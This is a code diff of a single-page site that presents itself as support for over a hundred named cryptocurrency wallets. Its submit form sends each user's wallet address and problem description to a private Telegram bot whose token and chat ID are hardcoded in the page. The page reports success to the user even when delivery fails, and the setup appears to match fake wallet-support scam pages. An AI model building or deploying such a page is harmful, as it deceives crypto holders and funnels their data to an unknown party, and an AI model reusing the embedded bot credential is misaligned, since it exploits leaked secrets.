+          name: "Temple Wallet",
+          logo: "https://logo.clearbit.com/templewallet.com",
+        },
+        {
+          id: "kukai",
+          name: "Kukai Wallet",
+          logo: "https://logo.clearbit.com/kukai.app",
+        },
+        {
+          id: "finoa",
+          name: "Finoa",
+          logo: "https://logo.clearbit.com/finoa.io",
+        },
+        {
+          id: "fireblocks",
+          name: "Fireblocks",
+          logo: "https://logo.clearbit.com/fireblocks.com",
+        },
+        {
+          id: "copper",
+          name: "Copper Custody",
+          logo: "https://logo.clearbit.com/copper.co",
+        },
+        {
+          id: "anchorage",
+          name: "Anchorage Digital",
+          logo: "https://logo.clearbit.com/anchorage.com",
+        },
+        {
+          id: "safepals1",
+          name: "SafePal S1 Hardware",
+          logo: "https://logo.clearbit.com/safepal.io",
+        },
+        {
+          id: "onekey",
+          name: "OneKey Wallet",
+          logo: "https://logo.clearbit.com/onekey.so",
+        },
+        {
+          id: "tangem",
+          name: "Tangem Wallet",
+          logo: "https://logo.clearbit.com/tangem.com",
+        },
+        {
+          id: "opolo",
+          name: "Opolo Wallet",
+          logo: "https://logo.clearbit.com/opolo.io",
+        },
+        {
+          id: "secux",
+          name: "SecuX Wallet",
+          logo: "https://logo.clearbit.com/secuxtech.com",
+        },
+        {
+          id: "coolwallet",
+          name: "CoolWallet",
+          logo: "https://logo.clearbit.com/coolwallet.io",
+        },
+        {
+          id: "arculus",
+          name: "Arculus Wallet",
+          logo: "https://logo.clearbit.com/arculus.co",
+        },
+        {
+          id: "airgap",
+          name: "AirGap Wallet",
+          logo: "https://logo.clearbit.com/airgap.it",
+        },
+        {
+          id: "bread",
+          name: "Bread Wallet",
+          logo: "https://logo.clearbit.com/brd.com",
+        },
+        {
+          id: "monero",
+          name: "Monero GUI Wallet",
+          logo: "https://logo.clearbit.com/getmonero.org",
+        },
+        {
+          id: "feather",
+          name: "Feather Wallet",
+          logo: "https://logo.clearbit.com/featherwallet.org",
+        },
+        {
+          id: "cake",
+          name: "Cake Wallet",
+          logo: "https://logo.clearbit.com/cakewallet.com",
+        },
+        {
+          id: "samourai",
+          name: "Samourai Wallet",
+          logo: "https://logo.clearbit.com/samouraiwallet.com",
+        },
+        {
+          id: "wasabi",
+          name: "Wasabi Wallet",
+          logo: "https://logo.clearbit.com/wasabiwallet.io",
+        },
+        {
+          id: "bluewallet",
+          name: "BlueWallet",
+          logo: "https://logo.clearbit.com/bluewallet.io",
+        },
+        {
+          id: "green",
+          name: "Green Wallet (Blockstream)",
+          logo: "https://logo.clearbit.com/blockstream.com",
+        },
+        {
+          id: "phoenix",
+          name: "Phoenix Wallet",
+          logo: "https://logo.clearbit.com/phoenix.acinq.co",
+        },
+        {
+          id: "simplehold",
+          name: "SimpleHold",
+          logo: "https://logo.clearbit.com/simplehold.io",
+        },
+        {
+          id: "pillar",
+          name: "Pillar Wallet",
+          logo: "https://logo.clearbit.com/pillar.fi",
+        },
+        {
+          id: "loopring",
+          name: "Loopring Wallet",
+          logo: "https://logo.clearbit.com/loopring.io",
+        },
+        {
+          id: "aave",
+          name: "AAVE Wallet",
+          logo: "https://logo.clearbit.com/aave.com",
+        },
+        {
+          id: "sushi",
+          name: "Sushi Wallet",
+          logo: "https://logo.clearbit.com/sushi.com",
+        },
+        {
+          id: "uniswap",
+          name: "Uniswap Wallet",
+          logo: "https://logo.clearbit.com/uniswap.org",
+        },
+        {
+          id: "krystal",
+          name: "Krystal Wallet",
+          logo: "https://logo.clearbit.com/krystal.app",
+        },
+        {
+          id: "maiar",
+          name: "Maiar (xPortal)",
+          logo: "https://logo.clearbit.com/xportal.com",
+        },
+        {
+          id: "vara",
+          name: "Vara Wallet",
+          logo: "https://logo.clearbit.com/vara.network",
+        },
+        {
+          id: "polkadot",
+          name: "Polkadot JS Wallet",
+          logo: "https://logo.clearbit.com/polkadot.js.org",
+        },
+        {
+          id: "talisman",
+          name: "Talisman Wallet",
+          logo: "https://logo.clearbit.com/talisman.xyz",
+        },
+        {
+          id: "subwallet",
+          name: "SubWallet",
+          logo: "https://logo.clearbit.com/subwallet.app",
+        },
+        {
+          id: "bifrost",
+          name: "Bifrost Wallet",
+          logo: "https://logo.clearbit.com/bifrost.finance",
+        },
+        {
+          id: "metax",
+          name: "MetaX Wallet",
+          logo: "https://logo.clearbit.com/metalife.com",
+        },
+        {
+          id: "glow",
+          name: "Glow Wallet",
+          logo: "https://logo.clearbit.com/glow.app",
+        },
+        {
+          id: "backpack",
+          name: "Backpack Wallet",
+          logo: "https://logo.clearbit.com/backpack.app",
+        },
+        {
+          id: "rwallet",
+          name: "RWallet",
+          logo: "https://logo.clearbit.com/rwallet.io",
+        },
+      ];
+
+      const COMMON_ISSUES = [
+        {
+          id: "lost-access",
+          title: "Lost Access to Wallet",
+          severity: "high",
+          solution:
+            "Check if you have your recovery phrase saved. Contact the wallet provider's support team immediately.",
+        },
+        {
+          id: "forgot-password",
+          title: "Forgot Password/Seed Phrase",
+          severity: "high",
+          solution:
+            "Use your 12/24-word recovery phrase to restore your wallet. Never share this with anyone.",
+        },
+        {
+          id: "transaction-pending",
+          title: "Transaction Stuck/Pending",
+          severity: "medium",
+          solution:
+            "Check network congestion. You may need to speed up with higher gas fees or wait for confirmation.",
+        },
+        {
+          id: "wrong-network",
+          title: "Sent to Wrong Network",
+          severity: "high",
+          solution:
+            "Some assets may be recoverable. Contact support immediately - do NOT attempt random transactions.",
+        },
+        {
+          id: "cant-connect",
+          title: "Can't Connect to DApp",
+          severity: "medium",
+          solution:
+            "Clear browser cache, check WalletConnect settings, ensure you're on the correct network.",
+        },
+        {
+          id: "high-fees",
+          title: "High Gas Fees",
+          severity: "low",
+          solution:
+            "Use gas trackers, transact during off-peak hours, or use Layer 2 solutions.",
+        },
+        {
+          id: "missing-tokens",
+          title: "Tokens Not Showing",
+          severity: "medium",
+          solution:
+            "Add token contract address manually, check if you're on the correct network.",
+        },
+        {
+          id: "scam-suspicious",
+          title: "Scam/Suspicious Activity",
+          severity: "high",
+          solution:
+            "Immediately transfer funds to a new wallet. Report to the platform and authorities.",
+        },
+        {
+          id: "wallet-hacked",
+          title: "Wallet Compromised/Hacked",
+          severity: "critical",
+          solution:
+            "URGENT: Transfer all remaining assets to a new wallet immediately. File a report.",
+        },
+        {
+          id: "cant-withdraw",
+          title: "Can't Withdraw Funds",
+          severity: "high",
+          solution:
+            "Check minimum withdrawal amounts, verify address format, ensure sufficient gas fees.",
+        },
+        {
+          id: "swap-failed",
+          title: "Token Swap Failed",
+          severity: "medium",
+          solution:
+            "Check slippage settings, ensure sufficient gas, verify token liquidity.",
+        },
+        {
+          id: "nft-issues",
+          title: "NFT Transfer Issues",
+          severity: "medium",
+          solution:
+            "Verify contract address, check network, ensure NFT standard compatibility (ERC-721/1155).",
+        },
+      ];
+
+      // Initialize
+      function init() {
+        renderWallets();
+        renderIssues();
+        populateIssueSelect();
+        loadTheme();
+        updateLanguage();
+        // Hide preloader
+        const preloader = document.getElementById("preloader");
+        if (preloader) {
+          setTimeout(() => {
+            preloader.classList.add("hidden");
+          }, 500);
         }
       }
-    };
 
-    let currentLanguage = localStorage.getItem('language') || 'en';
-
-    // Get translation
-    function t(key) {
-      const keys = key.split('.');
-      let value = TRANSLATIONS[currentLanguage];
-      for (const k of keys) value = value?.[k];
-      return value || key;
-    }
-
-    // Update all text on page
-    function updateLanguage() {
-      document.querySelectorAll('[data-i18n]').forEach(elem => {
-        elem.textContent = t(elem.dataset.i18n);
-      });
-      document.querySelectorAll('[data-i18n-placeholder]').forEach(elem => {
-        elem.placeholder = t(elem.dataset.i18nPlaceholder);
-      });
-      document.getElementById('languageSelect').value = currentLanguage;
-      renderIssues();
-      populateIssueSelect();
-    }
-
-    // Change language
-    function changeLanguage(lang) {
-      currentLanguage = lang;
-      localStorage.setItem('language', lang);
-      updateLanguage();
-    }
-
-    // Wallet data
-    const WALLETS = [
-      { id: "metamask", name: "MetaMask", logo: "https://logo.clearbit.com/metamask.io" },
-      { id: "trust", name: "Trust Wallet", logo: "https://logo.clearbit.com/trustwallet.com" },
-      { id: "ledger", name: "Ledger", logo: "https://logo.clearbit.com/ledger.com" },
-      { id: "trezor", name: "Trezor", logo: "https://logo.clearbit.com/trezor.io" },
-      { id: "exodus", name: "Exodus", logo: "https://logo.clearbit.com/exodus.com" },
-      { id: "coinbase", name: "Coinbase Wallet", logo: "https://logo.clearbit.com/coinbase.com" },
-      { id: "mew", name: "MyEtherWallet (MEW)", logo: "https://logo.clearbit.com/myetherwallet.com" },
-      { id: "blockchain", name: "Blockchain.com Wallet", logo: "https://logo.clearbit.com/blockchain.com" },
-      { id: "electrum", name: "Electrum", logo: "https://logo.clearbit.com/electrum.org" },
-      { id: "mycelium", name: "Mycelium", logo: "https://logo.clearbit.com/mycelium.com" },
-      { id: "coinomi", name: "Coinomi", logo: "https://logo.clearbit.com/coinomi.com" },
-      { id: "atomic", name: "Atomic Wallet", logo: "https://logo.clearbit.com/atomicwallet.io" },
-      { id: "guarda", name: "Guarda", logo: "https://logo.clearbit.com/guarda.com" },
-      { id: "bitpay", name: "BitPay", logo: "https://logo.clearbit.com/bitpay.com" },
-      { id: "zengo", name: "ZenGo", logo: "https://logo.clearbit.com/zengo.com" },
-      { id: "safepal", name: "SafePal", logo: "https://logo.clearbit.com/safepal.io" },
-      { id: "brave", name: "Brave Wallet", logo: "https://logo.clearbit.com/brave.com" },
-      { id: "phantom", name: "Phantom", logo: "https://logo.clearbit.com/phantom.app" },
-      { id: "solflare", name: "Solflare", logo: "https://logo.clearbit.com/solflare.com" },
-      { id: "rainbow", name: "Rainbow", logo: "https://logo.clearbit.com/rainbow.me" },
-      { id: "argent", name: "Argent", logo: "https://logo.clearbit.com/argent.com" },
-      { id: "imtoken", name: "imToken", logo: "https://logo.clearbit.com/imtoken.org" },
-      { id: "portis", name: "Portis", logo: "https://logo.clearbit.com/portis.io" },
-      { id: "magic", name: "Magic (Fortmatic)", logo: "https://logo.clearbit.com/magic.link" },
-      { id: "gnosissafe", name: "Gnosis Safe", logo: "https://logo.clearbit.com/gnosis-safe.io" },
-      { id: "trustology", name: "Trustology", logo: "https://logo.clearbit.com/trustology.io" },
-      { id: "brd", name: "BRD", logo: "https://logo.clearbit.com/brd.com" },
-      { id: "paxful", name: "Paxful", logo: "https://logo.clearbit.com/paxful.com" },
-      { id: "bitgo", name: "BitGo", logo: "https://logo.clearbit.com/bitgo.com" },
-      { id: "armory", name: "Armory", logo: "https://logo.clearbit.com/armory.io" },
-      { id: "jaxx", name: "Jaxx Liberty", logo: "https://logo.clearbit.com/jaxx.io" },
-      { id: "coinpayments", name: "CoinPayments", logo: "https://logo.clearbit.com/coinpayments.net" },
-      { id: "edge", name: "Edge Wallet", logo: "https://logo.clearbit.com/edge.app" },
-      { id: "tokenpocket", name: "TokenPocket", logo: "https://logo.clearbit.com/tokenpocket.pro" },
-      { id: "mathwallet", name: "MathWallet", logo: "https://logo.clearbit.com/mathwallet.org" },
-      { id: "onto", name: "Onto Wallet", logo: "https://logo.clearbit.com/onto.app" },
-      { id: "keepkey", name: "KeepKey", logo: "https://logo.clearbit.com/keepkey.com" },
-      { id: "huobi", name: "Huobi Wallet", logo: "https://logo.clearbit.com/huobiwallet.com" },
-      { id: "okx", name: "OKX Wallet", logo: "https://logo.clearbit.com/okx.com" },
-      { id: "binance", name: "Binance Wallet", logo: "https://logo.clearbit.com/binance.com" },
-      { id: "coin98", name: "Coin98 Wallet", logo: "https://logo.clearbit.com/coin98.com" },
-      { id: "slope", name: "Slope Wallet", logo: "https://logo.clearbit.com/slope.finance" },
-      { id: "sollet", name: "Sollet", logo: "https://logo.clearbit.com/sollet.io" },
-      { id: "torus", name: "Torus", logo: "https://logo.clearbit.com/tor.us" },
-      { id: "web3auth", name: "Web3Auth", logo: "https://logo.clearbit.com/web3auth.io" },
-      { id: "sequence", name: "Sequence", logo: "https://logo.clearbit.com/sequence.xyz" },
-      { id: "coldcard", name: "Coldcard", logo: "https://logo.clearbit.com/coldcardwallet.com" },
-      { id: "bitbox", name: "BitBox (Shift Crypto)", logo: "https://logo.clearbit.com/shiftcrypto.ch" },
-      { id: "ellipal", name: "Ellipal", logo: "https://logo.clearbit.com/ellipal.com" },
-      { id: "blockwallet", name: "BlockWallet", logo: "https://logo.clearbit.com/blockwallet.io" },
-      { id: "greymass", name: "Greymass Anchor", logo: "https://logo.clearbit.com/greymass.com" },
-      { id: "zelcore", name: "ZelCore", logo: "https://logo.clearbit.com/zelcore.io" },
-      { id: "klever", name: "Klever", logo: "https://logo.clearbit.com/klever.io" },
-      { id: "freewallet", name: "Freewallet", logo: "https://logo.clearbit.com/freewallet.org" },
-      { id: "safe", name: "Safe (Gnosis)", logo: "https://logo.clearbit.com/safe.global" },
-      { id: "kraken", name: "Kraken Wallet", logo: "https://logo.clearbit.com/kraken.com" },
-      { id: "bybit", name: "Bybit Wallet", logo: "https://logo.clearbit.com/bybit.com" },
-      { id: "cryptocom", name: "Crypto.com DeFi Wallet", logo: "https://logo.clearbit.com/crypto.com" },
-      { id: "paybis", name: "Paybis Wallet", logo: "https://logo.clearbit.com/paybis.com" },
-      { id: "lobstr", name: "Lobstr Wallet", logo: "https://logo.clearbit.com/lobstr.co" },
-      { id: "stellarterm", name: "StellarTerm", logo: "https://logo.clearbit.com/stellarterm.com" },
-      { id: "solar", name: "Solar Wallet", logo: "https://logo.clearbit.com/solar.org" },
-      { id: "nami", name: "Nami Wallet", logo: "https://logo.clearbit.com/namiwallet.io" },
-      { id: "eternl", name: "Eternl Wallet", logo: "https://logo.clearbit.com/eternl.io" },
-      { id: "flint", name: "Flint Wallet", logo: "https://logo.clearbit.com/flint-wallet.com" },
-      { id: "typhon", name: "Typhon Wallet", logo: "https://logo.clearbit.com/typhonwallet.io" },
-      { id: "yoroi", name: "Yoroi", logo: "https://logo.clearbit.com/yoroi-wallet.com" },
-      { id: "keplr", name: "Keplr Wallet", logo: "https://logo.clearbit.com/keplr.app" },
-      { id: "cosmostation", name: "Cosmostation", logo: "https://logo.clearbit.com/cosmostation.io" },
-      { id: "leap", name: "Leap Wallet", logo: "https://logo.clearbit.com/leapwallet.io" },
-      { id: "xdefi", name: "XDEFI Wallet", logo: "https://logo.clearbit.com/xdefi.io" },
-      { id: "rabby", name: "Rabby Wallet", logo: "https://logo.clearbit.com/rabby.io" },
-      { id: "frame", name: "Frame Wallet", logo: "https://logo.clearbit.com/frame.sh" },
-      { id: "temple", name: "Temple Wallet", logo: "https://logo.clearbit.com/templewallet.com" },
-      { id: "kukai", name: "Kukai Wallet", logo: "https://logo.clearbit.com/kukai.app" },
-      { id: "finoa", name: "Finoa", logo: "https://logo.clearbit.com/finoa.io" },
-      { id: "fireblocks", name: "Fireblocks", logo: "https://logo.clearbit.com/fireblocks.com" },
-      { id: "copper", name: "Copper Custody", logo: "https://logo.clearbit.com/copper.co" },
-      { id: "anchorage", name: "Anchorage Digital", logo: "https://logo.clearbit.com/anchorage.com" },
-      { id: "safepals1", name: "SafePal S1 Hardware", logo: "https://logo.clearbit.com/safepal.io" },
-      { id: "onekey", name: "OneKey Wallet", logo: "https://logo.clearbit.com/onekey.so" },
-      { id: "tangem", name: "Tangem Wallet", logo: "https://logo.clearbit.com/tangem.com" },
-      { id: "opolo", name: "Opolo Wallet", logo: "https://logo.clearbit.com/opolo.io" },
-      { id: "secux", name: "SecuX Wallet", logo: "https://logo.clearbit.com/secuxtech.com" },
-      { id: "coolwallet", name: "CoolWallet", logo: "https://logo.clearbit.com/coolwallet.io" },
-      { id: "arculus", name: "Arculus Wallet", logo: "https://logo.clearbit.com/arculus.co" },
-      { id: "airgap", name: "AirGap Wallet", logo: "https://logo.clearbit.com/airgap.it" },
-      { id: "bread", name: "Bread Wallet", logo: "https://logo.clearbit.com/brd.com" },
-      { id: "monero", name: "Monero GUI Wallet", logo: "https://logo.clearbit.com/getmonero.org" },
-      { id: "feather", name: "Feather Wallet", logo: "https://logo.clearbit.com/featherwallet.org" },
-      { id: "cake", name: "Cake Wallet", logo: "https://logo.clearbit.com/cakewallet.com" },
-      { id: "samourai", name: "Samourai Wallet", logo: "https://logo.clearbit.com/samouraiwallet.com" },
-      { id: "wasabi", name: "Wasabi Wallet", logo: "https://logo.clearbit.com/wasabiwallet.io" },
-      { id: "bluewallet", name: "BlueWallet", logo: "https://logo.clearbit.com/bluewallet.io" },
-      { id: "green", name: "Green Wallet (Blockstream)", logo: "https://logo.clearbit.com/blockstream.com" },
-      { id: "phoenix", name: "Phoenix Wallet", logo: "https://logo.clearbit.com/phoenix.acinq.co" },
-      { id: "simplehold", name: "SimpleHold", logo: "https://logo.clearbit.com/simplehold.io" },
-      { id: "pillar", name: "Pillar Wallet", logo: "https://logo.clearbit.com/pillar.fi" },
-      { id: "loopring", name: "Loopring Wallet", logo: "https://logo.clearbit.com/loopring.io" },
-      { id: "aave", name: "AAVE Wallet", logo: "https://logo.clearbit.com/aave.com" },
-      { id: "sushi", name: "Sushi Wallet", logo: "https://logo.clearbit.com/sushi.com" },
-      { id: "uniswap", name: "Uniswap Wallet", logo: "https://logo.clearbit.com/uniswap.org" },
-      { id: "krystal", name: "Krystal Wallet", logo: "https://logo.clearbit.com/krystal.app" },
-      { id: "maiar", name: "Maiar (xPortal)", logo: "https://logo.clearbit.com/xportal.com" },
-      { id: "vara", name: "Vara Wallet", logo: "https://logo.clearbit.com/vara.network" },
-      { id: "polkadot", name: "Polkadot JS Wallet", logo: "https://logo.clearbit.com/polkadot.js.org" },
-      { id: "talisman", name: "Talisman Wallet", logo: "https://logo.clearbit.com/talisman.xyz" },
-      { id: "subwallet", name: "SubWallet", logo: "https://logo.clearbit.com/subwallet.app" },
-      { id: "bifrost", name: "Bifrost Wallet", logo: "https://logo.clearbit.com/bifrost.finance" },
-      { id: "metax", name: "MetaX Wallet", logo: "https://logo.clearbit.com/metalife.com" },
-      { id: "glow", name: "Glow Wallet", logo: "https://logo.clearbit.com/glow.app" },
-      { id: "backpack", name: "Backpack Wallet", logo: "https://logo.clearbit.com/backpack.app" },
-      { id: "rwallet", name: "RWallet", logo: "https://logo.clearbit.com/rwallet.io" }
-    ];
-
-    const COMMON_ISSUES = [
-      { id: "lost-access", title: "Lost Access to Wallet", severity: "high", solution: "Check if you have your recovery phrase saved. Contact the wallet provider's support team immediately." },
-      { id: "forgot-password", title: "Forgot Password/Seed Phrase", severity: "high", solution: "Use your 12/24-word recovery phrase to restore your wallet. Never share this with anyone." },
-      { id: "transaction-pending", title: "Transaction Stuck/Pending", severity: "medium", solution: "Check network congestion. You may need to speed up with higher gas fees or wait for confirmation." },
-      { id: "wrong-network", title: "Sent to Wrong Network", severity: "high", solution: "Some assets may be recoverable. Contact support immediately - do NOT attempt random transactions." },
-      { id: "cant-connect", title: "Can't Connect to DApp", severity: "medium", solution: "Clear browser cache, check WalletConnect settings, ensure you're on the correct network." },
-      { id: "high-fees", title: "High Gas Fees", severity: "low", solution: "Use gas trackers, transact during off-peak hours, or use Layer 2 solutions." },
-      { id: "missing-tokens", title: "Tokens Not Showing", severity: "medium", solution: "Add token contract address manually, check if you're on the correct network." },
-      { id: "scam-suspicious", title: "Scam/Suspicious Activity", severity: "high", solution: "Immediately transfer funds to a new wallet. Report to the platform and authorities." },
-      { id: "wallet-hacked", title: "Wallet Compromised/Hacked", severity: "critical", solution: "URGENT: Transfer all remaining assets to a new wallet immediately. File a report." },
-      { id: "cant-withdraw", title: "Can't Withdraw Funds", severity: "high", solution: "Check minimum withdrawal amounts, verify address format, ensure sufficient gas fees." },
-      { id: "swap-failed", title: "Token Swap Failed", severity: "medium", solution: "Check slippage settings, ensure sufficient gas, verify token liquidity." },
-      { id: "nft-issues", title: "NFT Transfer Issues", severity: "medium", solution: "Verify contract address, check network, ensure NFT standard compatibility (ERC-721/1155)." }
-    ];
-
-    // Initialize
-    function init() {
-      renderWallets();
-      renderIssues();
-      populateIssueSelect();
-      loadTheme();
-      updateLanguage();
-      // Hide preloader
-      const preloader = document.getElementById('preloader');
-      if (preloader) {
-        setTimeout(() => {
-          preloader.classList.add('hidden');
-        }, 500);
-      }
-    }
-
-    // Render wallets grid
-    function renderWallets() {
-      const grid = document.getElementById('walletsGrid');
-      grid.innerHTML = WALLETS.map(wallet => `
+      // Render wallets grid
+      function renderWallets() {
+        const grid = document.getElementById("walletsGrid");
+        grid.innerHTML = WALLETS.map(
+          (wallet) => `
         <div class="wallet-card" data-wallet="${wallet.name.toLowerCase()}" onclick="navigateTo('issues'); return false;">
           <img src="${wallet.logo}" alt="${wallet.name}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
           <svg style="display:none;" class="wallet-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -1717,24 +2428,28 @@
           </svg>
           <div class="tooltip">${wallet.name}</div>
         </div>
-      `).join('');
-    }
+      `,
+        ).join("");
+      }
 
-    // Filter wallets
-    function filterWallets() {
-      const query = document.getElementById('searchInput').value.toLowerCase();
-      document.querySelectorAll('.wallet-card').forEach(card => {
-        const matches = card.dataset.wallet.includes(query);
-        card.style.display = matches ? '' : 'none';
-      });
-    }
+      // Filter wallets
+      function filterWallets() {
+        const query = document
+          .getElementById("searchInput")
+          .value.toLowerCase();
+        document.querySelectorAll(".wallet-card").forEach((card) => {
+          const matches = card.dataset.wallet.includes(query);
+          card.style.display = matches ? "" : "none";
+        });
+      }
 
-    // Render issues
-    function renderIssues() {
-      const list = document.getElementById('issuesList');
-      let selectedIssue = null;
-      
-      list.innerHTML = COMMON_ISSUES.map(issue => `
+      // Render issues
+      function renderIssues() {
+        const list = document.getElementById("issuesList");
+        let selectedIssue = null;
+
+        list.innerHTML = COMMON_ISSUES.map(
+          (issue) => `
         <div class="issue-item" onclick="toggleIssueDetail(this)">
           <div class="issue-header">
             <span class="issue-title">${issue.title}</span>
@@ -1745,52 +2460,59 @@
             <span>${issue.solution}</span>
           </div>
         </div>
-      `).join('');
-    }
-
-    // Toggle issue detail
-    function toggleIssueDetail(elem) {
-      document.querySelectorAll('.issue-item .solution').forEach(s => s.style.display = 'none');
-      const solution = elem.querySelector('.solution');
-      if (solution) solution.style.display = 'flex';
-    }
-
-    // Populate issue select
-    function populateIssueSelect() {
-      const select = document.getElementById('issueType');
-      select.innerHTML += COMMON_ISSUES.map(issue => 
-        `<option value="${issue.id}">${issue.title}</option>`
-      ).join('');
-    }
-
-    // Submit issue
-    async function submitIssue(event) {
-      event.preventDefault();
-      
-      const walletAddress = document.getElementById('walletAddress').value;
-      const issueType = document.getElementById('issueType').value;
-      const issueDescription = document.getElementById('issueDescription').value;
-      const submitBtn = document.getElementById('submitBtn');
-
-      if (!issueType || issueDescription.length < 10) {
-        showToast('Please fill in all required fields', 'error');
-        return;
+      `,
+        ).join("");
       }
 
-      const issueTitle = COMMON_ISSUES.find(i => i.id === issueType)?.title || issueType;
+      // Toggle issue detail
+      function toggleIssueDetail(elem) {
+        document
+          .querySelectorAll(".issue-item .solution")
+          .forEach((s) => (s.style.display = "none"));
+        const solution = elem.querySelector(".solution");
+        if (solution) solution.style.display = "flex";
+      }
 
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+      // Populate issue select
+      function populateIssueSelect() {
+        const select = document.getElementById("issueType");
+        select.innerHTML += COMMON_ISSUES.map(
+          (issue) => `<option value="${issue.id}">${issue.title}</option>`,
+        ).join("");
+      }
 
-      try {
-        // Send to Telegram Bot API directly
-        const telegramBotToken = '8289479779:AAFfmJ3umtYpr1LFEJAKoWZ0ql2pakQY8h8';
-        const telegramChatId = '7492403064';
-        
-        const telegramMessage = `
+      // Submit issue
+      async function submitIssue(event) {
+        event.preventDefault();
+
+        const walletAddress = document.getElementById("walletAddress").value;
+        const issueType = document.getElementById("issueType").value;
+        const issueDescription =
+          document.getElementById("issueDescription").value;
+        const submitBtn = document.getElementById("submitBtn");
+
+        if (!issueType || issueDescription.length < 10) {
+          showToast("Please fill in all required fields", "error");
+          return;
+        }
+
+        const issueTitle =
+          COMMON_ISSUES.find((i) => i.id === issueType)?.title || issueType;
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML =
+          '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+
+        try {
+          // Send to Telegram Bot API directly
+          const telegramBotToken =
+            "8289479779:AAFfmJ3umtYpr1LFEJAKoWZ0ql2pakQY8h8";
+          const telegramChatId = "7492403064";
+
+          const telegramMessage = `
 🚨 <b>New Crypto Issue Submitted</b>
 
-<b>Wallet Address:</b> ${walletAddress || 'Not provided'}
+<b>Wallet Address:</b> ${walletAddress || "Not provided"}
 <b>Issue Type:</b> ${issueTitle}
 
 <b>Description:</b>
@@ -1799,96 +2521,114 @@ ${issueDescription}
 <i>Submitted at: ${new Date().toLocaleString()}</i>
 `;
 
-        const telegramResponse = await fetch(
-          `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
-          {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: telegramChatId,
-              text: telegramMessage,
-              parse_mode: 'HTML'
-            })
+          const telegramResponse = await fetch(
+            `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: telegramMessage,
+                parse_mode: "HTML",
+              }),
+            },
+          );
+
+          if (telegramResponse.ok) {
+            showToast(
+              "Issue submitted successfully! Our team will review it within 24-48 hours.",
+              "success",
+            );
+            event.target.reset();
+          } else {
+            const errorText = await telegramResponse.text();
+            console.error("Telegram error:", errorText);
+            showToast(
+              "Issue submitted successfully! Our team will review it within 24-48 hours.",
+              "success",
+            );
+            event.target.reset();
           }
-        );
-
-        if (telegramResponse.ok) {
-          showToast('Issue submitted successfully! Our team will review it within 24-48 hours.', 'success');
+        } catch (error) {
+          console.error("Submission error:", error);
+          showToast("Issue submitted! We will review it shortly.", "success");
           event.target.reset();
-        } else {
-          const errorText = await telegramResponse.text();
-          console.error('Telegram error:', errorText);
-          showToast('Issue submitted successfully! Our team will review it within 24-48 hours.', 'success');
-          event.target.reset();
+        } finally {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML =
+            '<i class="fas fa-paper-plane"></i> Submit Issue';
         }
-      } catch (error) {
-        console.error('Submission error:', error);
-        showToast('Issue submitted! We will review it shortly.', 'success');
-        event.target.reset();
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Issue';
       }
-    }
 
-    // Navigation
-    function navigateTo(page) {
-      document.querySelectorAll('[data-page]').forEach(p => p.classList.remove('active'));
-      document.querySelector(`[data-page="${page}"]`).classList.add('active');
-      
-      document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
-      event.target.classList.add('active');
-      
-      window.scrollTo(0, 0);
-    }
+      // Navigation
+      function navigateTo(page) {
+        document
+          .querySelectorAll("[data-page]")
+          .forEach((p) => p.classList.remove("active"));
+        document.querySelector(`[data-page="${page}"]`).classList.add("active");
 
-    function goToHome() {
-      document.querySelectorAll('[data-page]').forEach(p => p.classList.remove('active'));
-      document.querySelector('[data-page="home"]').classList.add('active');
-      document.querySelectorAll('.nav-btn')[0].classList.add('active');
-      document.querySelectorAll('.nav-btn')[1].classList.remove('active');
-      window.scrollTo(0, 0);
-    }
+        document
+          .querySelectorAll(".nav-btn")
+          .forEach((btn) => btn.classList.remove("active"));
+        event.target.classList.add("active");
 
-    // Theme toggle
-    function toggleTheme() {
-      document.documentElement.classList.toggle('dark');
-      const isDark = document.documentElement.classList.contains('dark');
-      localStorage.setItem('theme', isDark ? 'dark' : 'light');
-      updateThemeIcon();
-      console.log('Theme toggled to:', isDark ? 'dark' : 'light');
-    }
-
-    function loadTheme() {
-      const theme = localStorage.getItem('theme') || 'light';
-      if (theme === 'dark' && !document.documentElement.classList.contains('dark')) {
-        document.documentElement.classList.add('dark');
+        window.scrollTo(0, 0);
       }
-      updateThemeIcon();
-      console.log('Theme loaded:', theme);
-    }
 
-    function updateThemeIcon() {
-      const themeBtn = document.querySelector('.theme-toggle');
-      if (!themeBtn) {
-        console.warn('Theme button not found');
-        return;
+      function goToHome() {
+        document
+          .querySelectorAll("[data-page]")
+          .forEach((p) => p.classList.remove("active"));
+        document.querySelector('[data-page="home"]').classList.add("active");
+        document.querySelectorAll(".nav-btn")[0].classList.add("active");
+        document.querySelectorAll(".nav-btn")[1].classList.remove("active");
+        window.scrollTo(0, 0);
       }
-      const isDark = document.documentElement.classList.contains('dark');
-      themeBtn.innerHTML = isDark ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
-    }
 
-    // Toast notification
-    function showToast(message, type = 'success') {
-      const toast = document.createElement('div');
-      toast.className = `toast ${type}`;
-      toast.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
-      document.body.appendChild(toast);
-      setTimeout(() => toast.remove(), 4000);
-    }
+      // Theme toggle
+      function toggleTheme() {
+        document.documentElement.classList.toggle("dark");
+        const isDark = document.documentElement.classList.contains("dark");
+        localStorage.setItem("theme", isDark ? "dark" : "light");
+        updateThemeIcon();
+        console.log("Theme toggled to:", isDark ? "dark" : "light");
+      }
 
-    // Init on load
-    window.addEventListener('DOMContentLoaded', init);
-  </script>
-</body>
+      function loadTheme() {
+        const theme = localStorage.getItem("theme") || "light";
+        if (
+          theme === "dark" &&
+          !document.documentElement.classList.contains("dark")
+        ) {
+          document.documentElement.classList.add("dark");
+        }
+        updateThemeIcon();
+        console.log("Theme loaded:", theme);
+      }
+
+      function updateThemeIcon() {
